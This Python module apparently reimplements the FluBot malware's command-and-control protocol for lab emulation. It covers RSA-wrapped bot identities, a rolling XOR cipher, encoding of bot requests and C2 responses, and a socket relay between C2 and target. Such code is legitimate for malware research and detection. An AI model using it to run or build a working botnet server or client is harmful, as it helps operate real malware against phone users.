from __future__ import annotations

import base64
import random
import socket
import struct
import threading
from dataclasses import dataclass
from typing import Callable, Optional

from Crypto.Cipher import PKCS1_v1_5
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA


MAGIC = 181030
SESSION_KEY_LEN = 10
SESSION_ALPHABET = "abcdefghijklmnopqrstuvwxy"
HTTP_PATH = "/poll.php"
BOT_ID = "0123456789ABCDEF0123456789ABCDEF"


class _DeterministicRand:
    def __init__(self, seed: bytes):
        self.seed = seed
        self.counter = 0
        self.buf = b""

    def __call__(self, n: int) -> bytes:
        while len(self.buf) < n:
            digest = SHA256.new(self.seed + self.counter.to_bytes(8, "big")).digest()
            self.buf += digest
            self.counter += 1
        out, self.buf = self.buf[:n], self.buf[n:]
        return out


def lab_rsa_key() -> RSA.RsaKey:
    # Stable lab key: every process derives the same 2048-bit RSA pair.
    # This preserves the malware's RSA/PKCS1Padding protocol shape without
    # depending on the original C2 private key.
    return RSA.generate(2048, randfunc=_DeterministicRand(b"flubot-lab-rsa-v1"))


def generate_session_key() -> str:
    rng = random.SystemRandom()
    return "".join(rng.choice(SESSION_ALPHABET) for _ in range(SESSION_KEY_LEN))


def xor_crypt(data: bytes, key: bytes, encrypt: bool) -> bytes:
    buf = bytearray(data)
    rolling_key = bytearray(key)
    previous_original = 0

    for i in range(len(buf)):
        key_index = i % len(rolling_key)
        if key_index == 0 and i != 0:
            if encrypt:
                update_byte = previous_original
            else:
                # During decrypt Java uses bArr[i - 1], already modified
                # in-place to plaintext by the previous iteration.
                update_byte = buf[i - 1]
            for j in range(len(rolling_key)):
                rolling_key[j] ^= update_byte

        previous_original = buf[i]
        buf[i] ^= rolling_key[key_index]

    return bytes(buf)


def b64(data: bytes) -> bytes:
    return base64.b64encode(data)


def b64decode(data: bytes | str) -> bytes:
    if isinstance(data, str):
        data = data.encode("ascii")
    return base64.b64decode(data)


def rsa_encrypt_identity(bot_id: str, session_key: str, public_key: RSA.RsaKey) -> bytes:
    cipher = PKCS1_v1_5.new(public_key)
    return b64(cipher.encrypt(f"{bot_id},{session_key}".encode("utf-8")))


def rsa_decrypt_identity(encoded: bytes, private_key: RSA.RsaKey) -> tuple[str, str]:
    cipher = PKCS1_v1_5.new(private_key)
    plaintext = cipher.decrypt(b64decode(encoded), sentinel=None)
    if plaintext is None:
        raise ValueError("RSA identity decrypt failed")
    parts = plaintext.decode("utf-8").split(",", 1)
    if len(parts) != 2:
        raise ValueError(f"Bad identity header: {plaintext!r}")
    return parts[0], parts[1]


def encode_http_request(payload: str, bot_id: str, public_key: RSA.RsaKey) -> tuple[bytes, str]:
    session_key = generate_session_key()
    encrypted_identity = rsa_encrypt_identity(bot_id, session_key, public_key)
    encrypted_payload = xor_crypt(payload.encode("utf-8"), session_key.encode("ascii"), True)
    return encrypted_identity + b"\r\n" + b64(encrypted_payload), session_key


@dataclass
class DecodedRequest:
    bot_id: str
    session_key: str
    payload: str


def decode_http_request(body: bytes, private_key: RSA.RsaKey) -> DecodedRequest:
    first, second = body.split(b"\r\n", 1)
    bot_id, session_key = rsa_decrypt_identity(first, private_key)
    payload = xor_crypt(b64decode(second), session_key.encode("ascii"), False)
    return DecodedRequest(bot_id=bot_id, session_key=session_key, payload=payload.decode("utf-8"))


def encode_http_response(bot_id: str, session_key: str, command: str) -> bytes:
    plaintext = f"{bot_id},{session_key}\r\n{command}".encode("utf-8")
    return b64(xor_crypt(plaintext, session_key.encode("ascii"), True))


def decode_http_response(body: bytes, bot_id: str, session_key: str) -> str:
    plaintext = xor_crypt(b64decode(body), session_key.encode("ascii"), False).decode("utf-8")
    header, command = plaintext.split("\r\n", 1)
    expected = f"{bot_id},{session_key}"
    if header != expected:
        raise ValueError(f"Unexpected response header {header!r}, expected {expected!r}")
    return command


def pack_magic() -> bytes:
    return struct.pack(">I", MAGIC)


def pack_u16(value: int) -> bytes:
    return struct.pack(">H", value)


def pack_u32(value: int) -> bytes:
    return struct.pack(">I", value)


def recv_exact(sock: socket.socket, n: int) -> bytes:
    chunks = []
    remaining = n
    while remaining:
        chunk = sock.recv(remaining)
        if not chunk:
            raise EOFError(f"socket closed while reading {n} bytes")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def relay(src: socket.socket, dst: socket.socket, label: str, log: Optional[Callable[[str], None]] = None) -> None:
    try:
        while True:
            data = src.recv(512)
            if not data:
                break
            if log:
                log(f"{label}: {len(data)} bytes")
            dst.sendall(data)
    except OSError:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def start_relay_pair(left: socket.socket, right: socket.socket, log: Optional[Callable[[str], None]] = None) -> None:
    t1 = threading.Thread(target=relay, args=(left, right, "C2->target", log), daemon=True)
    t2 = threading.Thread(target=relay, args=(right, left, "target->C2", log), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
